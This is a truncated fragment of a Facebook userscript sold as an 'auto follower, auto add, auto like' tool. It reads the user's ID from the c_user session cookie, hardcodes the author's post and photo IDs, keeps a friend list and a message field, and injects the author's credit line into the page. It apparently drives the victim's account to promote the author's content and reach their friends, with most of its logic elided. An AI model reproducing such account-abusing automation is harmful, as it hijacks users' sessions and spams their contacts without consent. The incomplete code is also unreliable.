// ==UserScript==
// @name            Facebook Auto Follower Auto Add Auto Like v12 New 2013 - 2014
// @description     Facebook Auto New 2013 - 2014 By Abdussalam
...
var spost_id = "100000394645392_566173440072472";
var sfoto_id = "553056628050820";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Abdussalam';
